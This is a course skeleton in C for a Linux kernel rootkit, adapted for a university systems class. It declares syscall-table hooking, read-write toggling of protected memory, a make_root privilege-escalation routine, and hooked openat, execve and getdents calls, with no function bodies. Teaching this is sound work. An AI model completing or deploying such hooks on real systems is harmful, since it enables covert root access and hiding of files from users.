/*
 * 3000rootkit
 * This skeleton has been adapted for COMP3000 by William Findlay.
 * Original skeleton written by Legion.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>
#include <asm/errno.h>
#include <linux/fcntl.h>
#include <linux/limits.h>

/* Information about a hooked system call */
typedef struct
{
  unsigned int  offset;     /* offset in the syscall_table to hook/unhook */
  unsigned long *orig_func; /* original syscall function */
  unsigned long *hook_func; /* replacement syscall function */
  bool hooked;              /* have we hooked yet? */

} syscall_hook_t;

/* Linked list to maintain information about our hooks calls */
typedef struct
{
  syscall_hook_t   *hook;
  struct list_head list;
} syscall_hook_list_t;

/* Legacy dirent struct */
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

void set_addr_rw(const unsigned long addr);
void set_addr_ro(const unsigned long addr);
int hook_syscall(syscall_hook_t *hook);
int unhook_syscall(syscall_hook_t *hook);
int make_root(void);
syscall_hook_t *find_syscall_hook(const unsigned int offset);
syscall_hook_t *new_hook(const unsigned int offset, void *newFunc);

asmlinkage int new_openat(int dirfd, const char *pathname, int flags, mode_t mode);
asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]);
asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

MODULE_AUTHOR("William Findlay and Legion");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("3000rootkit");
MODULE_VERSION("0.0.1");

